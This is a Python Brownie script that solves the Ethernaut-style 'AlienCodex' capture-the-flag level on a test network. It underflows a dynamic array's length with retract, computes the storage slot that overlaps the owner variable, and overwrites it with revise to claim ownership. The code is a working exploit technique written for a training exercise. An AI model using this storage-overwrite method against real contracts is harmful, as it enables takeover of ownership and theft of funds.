from brownie import accounts, config, AlienCodex
from web3 import Web3

# load account
account = accounts.load("Rinkeby_Test_Net_Account")
# get instance
instance_address = "0x65416120429ecfCca5ED024bd3DfC8851f328A94"
alien_codex = AlienCodex.at(instance_address)

# set variables
max_uint = 2 ** 256
start_of_array = Web3.toInt(Web3.solidityKeccak(["uint256"], [1]))

# -------------------------------------
# Claim ownership to complete the level.
# -------------------------------------


def level_completed():
    return alien_codex.owner() == account.address


def exploit():
    # view the owner of the contract
    print(f"The owner of the contract is: {alien_codex.owner()}")

    # make contact
    tx = alien_codex.make_contact({"from": account})
    tx.wait(1)

    # set up web3
    rpc_url = config["wallets"]["endpoint"]
    w3 = Web3(Web3.HTTPProvider(rpc_url))

    # view storage lot 0 of AlienCodex -> owner address + true
    data_0 = w3.eth.get_storage_at(instance_address, 0)
    data_0 = Web3.toHex(data_0)
    print(f"data: {data_0}")

    # location of owner variable in array
    owner_location = max_uint - start_of_array
    print(f"Owner is located at: {owner_location}")

    # call retract so that the length of the array overflows
    print(f"Length of array: {Web3.toInt(w3.eth.get_storage_at(instance_address, 1))}")
    tx = alien_codex.retract({"from": account})
    tx.wait(1)
    print(f"Length of array: {Web3.toInt(w3.eth.get_storage_at(instance_address, 1))}")

    # modify owner element in dynamic array
    tx = alien_codex.revise(owner_location, account.address, {"from": account})
    tx.wait(1)

    # confirm we have completed the level
    print(f"Level has been completed: {level_completed()}")


def main():
    exploit()
